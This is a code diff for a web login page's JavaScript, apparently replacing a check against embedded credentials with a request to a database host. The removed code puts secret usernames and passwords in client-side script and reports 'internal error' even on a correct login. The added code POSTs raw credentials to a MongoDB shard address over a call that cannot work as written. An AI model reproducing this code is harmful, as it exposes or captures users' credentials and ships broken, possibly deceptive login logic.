@@ -98,25 +98,39 @@
       var username = document.getElementById("username").value;
       var password = document.getElementById("password").value;
       var agreeCheckbox = document.getElementById("agreeCheckbox").checked;
-
-      // Get the actual secret values from the environment
-      var secretUsername1 = $USERNAME
-      var secretPassword1 = $PASSWORD
-      var secretUsername2 = $USERNAME2
-      var secretPassword2 = $PASSWORD2
-
-      if ((username === secretUsername1 && password === secretPassword1) || (username === secretUsername2 && password === secretPassword2)) {
-        if (agreeCheckbox) {
-          document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occured.";
-          //document.getElementById("message").innerHTML = "<p class='success-message'>Login successful, you will be redirected in a few seconds.";
-        } else {
-          document.getElementById("message").innerHTML = "<p class='error-message'>Please confirm you are not a robot.</p>";
+  
+      // Send a request to the MongoDB web server
+      fetch('ac-fzrovah-shard-00-01.ig25tpb.mongodb.net:27017', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'global-token-reponse-header': 'MIO-499483',
+        },
+        body: JSON.stringify({ username, password }),
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Failed to fetch');
         }
-      } else {
-        document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occured.</p>";
-      }
+        return response.text();
+      })
+      .then(data => {
+        if (data === 'yea ok thats good!!') {
+          if (agreeCheckbox) {
+            document.getElementById("message").innerHTML = "<p class='success-message'>Login successful, you will be redirected in a few seconds.</p>";
+          } else {
+            document.getElementById("message").innerHTML = "<p class='error-message'>Please confirm you are not a robot.</p>";
+          }
+        } else {
+          document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occurred.</p>";
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occurred.</p>";
+      });
     });
-</script>
+  </script>  
 
 </body>
 </html>
